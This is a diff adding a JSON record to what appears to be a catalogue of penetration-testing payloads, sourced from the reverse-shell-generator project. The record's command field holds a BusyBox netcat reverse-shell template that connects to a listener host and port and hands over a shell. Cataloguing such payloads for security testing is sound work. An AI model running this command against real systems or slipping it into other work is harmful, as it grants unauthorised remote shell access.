@@ -1,0 +1,28 @@
+{
+  "id": "rsg-reverseshell-busybox-nc-e",
+  "name": "RSG · ReverseShell · BusyBox nc -e",
+  "command": "busybox nc <lhost> <lport> -e <shell>",
+  "description": "Reverse Shell payload — BusyBox nc -e (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/BusyBox nc -e/8",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
